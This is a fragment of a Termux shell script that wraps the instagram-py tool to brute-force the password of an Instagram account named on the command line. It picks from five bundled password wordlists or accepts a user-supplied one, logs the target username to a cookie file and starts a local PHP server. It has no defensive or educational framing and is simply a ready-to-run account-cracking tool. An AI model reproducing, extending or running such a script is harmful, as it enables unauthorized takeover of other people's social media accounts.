echo -e " \033[1;37m +----------------------------------------------+"
}
if [ $3 = "--pass" ]; then
echo ""
if [ $1 = "--user" ]; then
clear
if [ $4 = 1 ]; then
value="/data/data/com.termux/files/usr/cookies/password-1.txt"
elif [ $4 = 2 ]; then
value="/data/data/com.termux/files/usr/cookies/password-2.txt"
elif [ $4 = 3 ]; then
value="/data/data/com.termux/files/usr/cookies/password-3.txt"
elif [ $4 = 4 ]; then
value="/data/data/com.termux/files/usr/cookies/password-4.txt"
elif [ $4 = 5 ]; then
value="/data/data/com.termux/files/usr/cookies/password-5.txt"
else
clear
echo " choose password option"
exit
fi
banners
cd /data/data/com.termux/files/usr/cookies
php -S 127.0.0.1:4444 > /dev/null 2>&1 &
echo " User : $2 " >> /data/data/com.termux/files/usr/cookies/cookie.txt
instagram-py --username $2 --password-list $value
xdg-open http://127.0.0.1:4444  > /dev/null 2>&1 &
sleep 10
exit
else
echo " Something Wrong"
exit
fi
else
echo ""
clear
fi
if [ $3 = "--passadd" ]; then
echo ""
if [ $1 = "--user" ]; then
echo ""
cp -r $4 /data/data/com.termux/files/usr/cookies/
clear
banners
cd /data/data/com.termux/files/usr/cookies
php -S 127.0.0.1:4444 > /dev/null 2>&1 &
echo " User : $2 " >> /data/data/com.termux/files/usr/cookies/cookie.txt
instagram-py --username $2 --password-list $4
xdg-open http://127.0.0.1:4444  > /dev/null 2>&1 &
sleep 10
exit
else
echo " Something Wrong"
exit
fi
else
echo ""
clear
fi
if [ $1 = "--help" ]; then
echo " Usrer Guid"
exit
elif [ $1 = "--update" ]; then
echo " Update tool"
exit
elif [ $1 = "--error" ]; then
echo " Error"
exit
elif [ $1 = "--check" ]; then
echo " Check"
exit
elif [ $1 = "developer" ]; then
echo " Developer"
exit
else
echo ""
clear
fi
clear
































